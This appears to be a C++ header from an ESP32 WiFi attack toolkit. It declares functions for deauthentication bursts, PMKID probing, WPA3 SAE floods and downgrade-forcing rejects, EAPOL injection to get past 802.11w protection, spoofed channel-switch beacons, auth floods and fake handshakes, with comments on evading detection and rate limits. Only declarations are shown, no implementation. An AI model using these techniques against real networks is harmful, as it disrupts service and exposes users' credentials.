// WSL Bypasser - bypass ESP32 WiFi frame validation
// Hamlet flavor: MAC randomization + association + deauth
#pragma once

#include <Arduino.h>

namespace WSLBypasser {

// init bypasser (call early in setup)
void init();

// randomize MAC before promiscuous/probing (locally-administered to dodge fingerprints)
void randomizeMAC();

// send Open System auth (seq 1) — must precede association for PMKID
bool sendAuthentication(const uint8_t* bssid);

// send association request for PMKID probing; returns success
bool sendAssociationRequest(const uint8_t* bssid, const char* ssid);

// send deauth frame to force reconnection (default reason 7)
bool sendDeauth(const uint8_t* bssid, const uint8_t* client, uint8_t reason = 7);

// deauth burst with jitter (PORKCHOP mudball vibes)
void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client, uint8_t count = 3, uint16_t jitterMs = 50);

// bidirectional deauth burst (PIG ANGRY): AP->client + spoofed client->AP; better at forcing drops
void sendBidirectionalDeauthBurst(const uint8_t* bssid, const uint8_t* client, uint8_t count = 10, uint16_t jitterMs = 40);

// directed probe to reveal hidden SSID; AP replies with real name
bool sendProbeRequest(const uint8_t* bssid);

// ==[ C5MONSTER ]== SAE commit flood for WPA3 targets
// sends single SAE Authentication Commit with random scalar+element (forces ECC validation ~10-50ms)
bool sendSAECommit(const uint8_t* bssid);

// SAE commit flood burst — random MAC per frame bypasses per-MAC rate limiting
void sendSAEFlood(const uint8_t* bssid, uint8_t count = 5, uint16_t jitterMs = 20);

// SAE auth reject — spoofed AP→client response to block WPA3 auth on transition networks
// forces client fallback to WPA2-PSK (downgrade). authSeq matches the frame being rejected.
bool sendSAEReject(const uint8_t* bssid, const uint8_t* client, uint8_t authSeq = 1);

// ==[ PMF BYPASS ]== EAPOL is a data frame — NOT protected by 802.11w
// spoofed from client to AP. forces AP to restart 802.1X auth → 4-way handshake.
bool sendEAPOLStart(const uint8_t* bssid, const uint8_t* clientMac);

// spoofed from client to AP. terminates session → client must reconnect.
bool sendEAPOLLogoff(const uint8_t* bssid, const uint8_t* clientMac);

// ==[ CSA HERD ]== spoofed beacon with Channel Switch Announcement IE
// forces clients to migrate to targetChannel within switchCount beacon intervals.
bool sendCSABeacon(const uint8_t* bssid, const char* ssid,
                   uint8_t currentChan, uint8_t targetChannel, uint8_t switchCount = 3);

// ==[ AUTH FLOOD ]== random-MAC auth frames to exhaust AP's STA table
// each frame 30 bytes. last resort when deauth + EAPOL injection both fail.
bool sendAuthFlood(const uint8_t* bssid, uint8_t count = 10, uint16_t jitterMs = 10);

// ==[ HOGWASH ]== fake EAPOL 4-way handshake frames for chaff injection
// structurally valid M1+M2 that hashcat accepts but can never crack.
// bssid = target AP, fakeSta = random client MAC, replayCounter must match M1<->M2.
bool sendFakeEAPOLM1(const uint8_t* bssid, const uint8_t* fakeSta,
                     const uint8_t* anonce, uint64_t replayCounter);
bool sendFakeEAPOLM2(const uint8_t* bssid, const uint8_t* fakeSta,
                     const uint8_t* snonce, const uint8_t* fakeMic,
                     uint64_t replayCounter);

// TX diagnostics — call periodically to log ok/fail counts
void logTxStats();

}

